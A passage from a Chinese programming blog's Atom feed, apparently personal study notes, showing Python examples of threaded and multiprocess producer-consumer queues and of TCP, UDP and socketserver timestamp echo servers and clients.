<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    nloops <span class="token operator">=</span> <span class="token number">5</span>    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        t <span class="token operator">=</span> MyThread<span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token punctuation">,</span> nloops<span class="token punctuation">)</span><span class="token punctuation">,</span> funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411121807570.png" alt="" loading="lazy"></p><h3 id="生产者，消费者-多进程"><a href="#生产者，消费者-多进程" class="headerlink" title="生产者，消费者(多进程)"></a>生产者，消费者(多进程)</h3><p><code>multiprocessing</code>模块方法参考python官方文档：<a href="https://docs.python.org/zh-cn/3.7/library/multiprocessing.html#module-multiprocessing" target="_blank" rel="noopener">multiprocessing</a> — 基于进程的并行</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> multiprocessing <span class="token keyword">import</span> Process<span class="token punctuation">,</span> JoinableQueue<span class="token keyword">import</span> time<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">consumer</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#从对列中取出并返回对象</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s 吃掉了 %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span>        q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#发送信号给q.join(),说明已经从队列中取走一个数据并处理完毕</span><span class="token keyword">def</span> <span class="token function">producer</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> name<span class="token punctuation">,</span> food<span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">'%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>food<span class="token punctuation">)</span>    q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#将res放入队列</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s 生产了 %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span>    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 等到消费者把自己放入队列中的所有的数据都取走之后，生产者才结束</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    q <span class="token operator">=</span> JoinableQueue<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 使用JoinableQueue()</span>    foods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"包子"</span><span class="token punctuation">,</span><span class="token string">"豆浆"</span><span class="token punctuation">,</span><span class="token string">"油条"</span><span class="token punctuation">,</span><span class="token string">"稀饭"</span><span class="token punctuation">]</span>    producerthreads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    consumerthreads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>foods<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>producer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token string">'厨师'</span><span class="token punctuation">,</span> foods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        producerthreads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>        producerthreads<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>foods<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>consumer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token string">'吃货'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        consumerthreads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>        consumerthreads<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>        consumerthreads<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>producerthreads<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        producerthreads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 1、主进程等生产者p1,p2,p3结束</span>    <span class="token comment" spellcheck="true"># 2、而p1，p2，p3，是在消费者把所有数据都取干净之后才会结束</span>    <span class="token comment" spellcheck="true"># 3、所以一旦p1,p2,p3结束了，证明消费者也没必要存在了，应该随着主进程一块死掉，因而需要将生产者们设置成守护进程</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"END"</span><span class="token punctuation">)</span></code></pre><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410113256008.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;threading模块&quot;&gt;&lt;a href=&quot;#threading模块&quot; class=&quot;headerlink&quot; title=&quot;threading模块&quot;&gt;&lt;/a&gt;threading模块&lt;/h3&gt;&lt;p&gt;可用对象列表&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;对象&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Thread&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;表示一个执行线程的对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Lock&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;锁原语对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RLock&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;可重入锁对象，使单一的线程可以(再次)获得已持有的做(递归锁)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Condition&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;条件变量对象，使得一个线程等待另一个线程满足的特定的”条件”，比如改变状态或某个数据值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Event&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;条件变量的通用版本，任意数量的线程等待某个事件的发生，在该事件发生后所有的线程将被激活&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Semaphore&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;为线程间共享的有限资源提供了一个”计数器”，如果没有可用资源时会被阻塞&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;BoundedSemaphore&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;与Semaphore相似，不过它要在运行前等待一段时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Timer&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;与Thread相似，不过它要在运行前等待一段时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Barrier&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;创建一个”障碍”，必须达到指定数量的线程后才可以继续&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-网络编程</title>
    <link href="https://www.extrader.top/2020/04/08/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>https://www.extrader.top/2020/04/08/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</id>
    <published>2020-04-08T04:03:06.000Z</published>
    <updated>2020-07-14T10:44:00.844Z</updated>
    
    <content type="html"><![CDATA[<h3 id="scoket模块"><a href="#scoket模块" class="headerlink" title="scoket模块"></a>scoket模块</h3><p>需要进行网络编程就要创建套接字，而在python中要创建套接字，就必须使用<code>socket.scoket()</code>函数，它的一般语法如下：</p><pre class=" language-python"><code class="language-python">socket<span class="token punctuation">(</span>scoket_family<span class="token punctuation">,</span>scoket_type<span class="token punctuation">,</span>protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p><code>scoket_family</code>可以是<code>AF_UNIX</code>或<code>AF_INET(6)</code></p><ul><li><strong>AF_UNIX</strong>：UNIX，用于单一的<code>UNIX</code>系统进程之间的通信</li><li><strong>AF_INET(6)</strong>：因特网，IPv4或IPv6</li></ul><p><code>scoket_type</code>可以是<code>SOCK_STREAM</code>或<code>SOCK_DGRAM</code></p><ul><li><strong>SOCK_STREAM</strong>：TCP，面向连接的套接字(流套接字，虚拟电路)，主要协议是TCP(传输控制协议)</li><li><strong>SOCK_DGRAM</strong>：UDP，无连接的套接字(数据报)，主要协议为UDP(用户数据报协议)protocol</li></ul><p><code>protocol</code>参数为与特定的地址家族相关的协议，默认为0(根据地址格式和套接类别,自动选择一个合适的协议)，该参数通常省略</p><a id="more"></a><p>创建<code>TCP/IP</code>套接字</p><pre class=" language-python"><code class="language-python">tcpSock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></code></pre><p>创建<code>UPD/IP</code>套接字</p><pre class=" language-python"><code class="language-python">udpSock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span></code></pre><p>服务器套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.bind()</td><td align="center">将地址(主机名字),绑定到套接字上，参数需要为元祖格式</td></tr><tr><td align="center">s.listen()</td><td align="center">设置并启动TCP监听器，参数为最大挂起连接数</td></tr><tr><td align="center">s.accept()</td><td align="center">被动接受TCP客户端连接，一直等待到连接到达(阻塞)</td></tr></tbody></table><p>客户端套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.connect()</td><td align="center">主动发起TCP服务器连接</td></tr><tr><td align="center">s.connect_ex()</td><td align="center">connect的扩展版本，会以错误码形式返回问题，而不是抛出一个异常</td></tr></tbody></table><p>普通套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.recv()</td><td align="center">接受TCP消息</td></tr><tr><td align="center">s.send()</td><td align="center">发送TCP消息</td></tr><tr><td align="center">s.sendall</td><td align="center">完整的发送TCP消息</td></tr><tr><td align="center">s.recvfrom()</td><td align="center">接收UDP消息</td></tr><tr><td align="center">s.sendto()</td><td align="center">发送UDP消息</td></tr><tr><td align="center">s.shutdown()</td><td align="center">关闭连接</td></tr><tr><td align="center">s.close()</td><td align="center">关闭套接字</td></tr></tbody></table><h3 id="TCP时间戳服务器"><a href="#TCP时间戳服务器" class="headerlink" title="TCP时间戳服务器"></a>TCP时间戳服务器</h3><p>服务器</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> ctimeHOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>tcpSerSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>tcpSerSock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span>tcpSerSock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for connection..."</span><span class="token punctuation">)</span>    tcpCliSock<span class="token punctuation">,</span> addr <span class="token operator">=</span> tcpSerSock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...connected from:{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> tcpCliSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>        tcpCliSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"[{}] {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    tcpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>tcpSerSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>客户端</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> ctimeHOST <span class="token operator">=</span> <span class="token string">"192.168.0.102"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>tcpCliSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>tcpCliSock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>        <span class="token keyword">break</span>    tcpCliSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> tcpCliSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tcpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408155313046.png" alt="" loading="lazy"></p><h3 id="UDP时间戳服务器"><a href="#UDP时间戳服务器" class="headerlink" title="UDP时间戳服务器"></a>UDP时间戳服务器</h3><p>服务器</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> ctimeHOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>udpSerSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_DGRAM<span class="token punctuation">)</span>udpSerSock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for message..."</span><span class="token punctuation">)</span>    data<span class="token punctuation">,</span> addr <span class="token operator">=</span> udpSerSock<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>    udpSerSock<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span><span class="token string">"[{}] {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...received from and returned to :{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>udpSerSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>客户端</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>HOST <span class="token operator">=</span> <span class="token string">"192.168.0.102"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>udpCliSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_DGRAM<span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>        <span class="token keyword">break</span>    udpCliSock<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ADDR<span class="token punctuation">)</span>    data<span class="token punctuation">,</span> ADDR <span class="token operator">=</span> udpCliSock<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>udpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408162549689.png" alt="" loading="lazy"></p><h3 id="scoketserver模块"><a href="#scoketserver模块" class="headerlink" title="scoketserver模块"></a>scoketserver模块</h3><p><code>socketserver</code>是标准库中的一个高级别的模块。用于简化实现网络客户端与服务器所需要的大量样板代码。模块中已经实现了一些可以使用的类</p><table><thead><tr><th align="center">类</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BaseServer</td><td align="center">包含核心服务器功能和mix-in的钩子，仅用于推导，不创建类的实例</td></tr><tr><td align="center">TCPServer/UDPServer</td><td align="center">基础的网络同步TCP/UDP服务器</td></tr><tr><td align="center">UnixStreamServer/UnixDatagramServer</td><td align="center">基于文件的基础同步TCP/UDP服务器</td></tr><tr><td align="center">BaseRequestHandler</td><td align="center">包含处理服务器请求的核心功能，仅用于推导，不创建类的实例</td></tr><tr><td align="center">StreamRequestHandler/DatagramRequestHandler</td><td align="center">实现TCP/UDP服务器的服务处理器</td></tr></tbody></table><h3 id="scoketserver-TCP-服务器"><a href="#scoketserver-TCP-服务器" class="headerlink" title="scoketserver TCP 服务器"></a>scoketserver TCP 服务器</h3><p>服务器</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> socketserver <span class="token keyword">import</span> <span class="token punctuation">(</span>TCPServer <span class="token keyword">as</span> TCP<span class="token punctuation">,</span> StreamRequestHandler <span class="token keyword">as</span> SRH<span class="token punctuation">)</span><span class="token keyword">from</span> time <span class="token keyword">import</span> ctimeHOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MyRequestHandler</span><span class="token punctuation">(</span>SRH<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...conneceted from :{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>client_address<span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"[{}] {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tcpServ <span class="token operator">=</span> TCP<span class="token punctuation">(</span>ADDR<span class="token punctuation">,</span>MyRequestHandler<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"waiting for connection..."</span><span class="token punctuation">)</span>tcpServ<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>客户端</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>HOST <span class="token operator">=</span> <span class="token string">"192.168.0.102"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tcpCliSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>    tcpCliSock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span>    data <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>        <span class="token keyword">break</span>    tcpCliSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"{}\r\n"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> tcpCliSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    tcpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408171411501.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;scoket模块&quot;&gt;&lt;a href=&quot;#scoket模块&quot; class=&quot;headerlink&quot; title=&quot;scoket模块&quot;&gt;&lt;/a&gt;scoket模块&lt;/h3&gt;&lt;p&gt;需要进行网络编程就要创建套接字，而在python中要创建套接字，就必须使用&lt;code&gt;socket.scoket()&lt;/code&gt;函数，它的一般语法如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;socket(scoket_family,scoket_type,protocol=0)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;scoket_family&lt;/code&gt;可以是&lt;code&gt;AF_UNIX&lt;/code&gt;或&lt;code&gt;AF_INET(6)&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
